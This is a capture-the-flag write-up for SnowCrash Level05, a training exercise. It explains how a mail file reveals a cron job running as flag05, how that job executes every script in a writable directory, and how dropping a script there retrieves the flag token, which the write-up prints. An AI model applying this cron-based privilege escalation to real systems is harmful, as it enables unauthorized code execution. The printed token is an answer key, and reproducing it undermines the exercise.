# 🚩 SnowCrash — Level05

## 🎯 Goal

Find the password for **flag05**.

---

## 1. Check for mail

When connecting via SSH, you see:

```
You have new mail.
```

Search for mail directories:

```bash
find / -name mail 2>/dev/null
```

**Result:**

```
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail
```

Check each directory:

```bash
ls /var/mail
```

**Result:**

```
level05
```

Read the mail:

```bash
cat /var/mail/level05
```

**Content:**

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This is a **cron job** that runs every 2 minutes as the **flag05** user.

Verify that cron is running:

```bash
ps aux | grep cron
```

**Result:**

```
root      1316  0.0  0.0   2616   888 ?        Ss   09:47   0:00 cron
level05   3431  0.0  0.0   4380   804 pts/0    S+   14:20   0:00 grep --color=auto cron
```

---

## 2. Analyze the cron script

```bash
cat /usr/sbin/openarenaserver
```

**Content:**

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

**Analysis:**
- The script loops through all files in `/opt/openarenaserver/`
- Executes each file as a bash script with **flag05** privileges
- Deletes the file after execution
- Runs every 2 minutes via cron

**Vulnerability:** We can place our own script in `/opt/openarenaserver/` and it will be executed as flag05!

---

## 3. Exploit the cron job

Check if the directory is writable:

```bash
ls -la /opt/openarenaserver/
```

Create a malicious script:

```bash
echo 'getflag > /tmp/flag05_token' > /opt/openarenaserver/exploit.sh
```

**Wait 2 minutes** for the cron job to execute, then read the token:

```bash
cat /tmp/flag05_token
```

---

## ✅ Result

Output:

```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---

## 🎉 **Final Token for Level05**

```
viuaaale9huek52boumoomioc
```
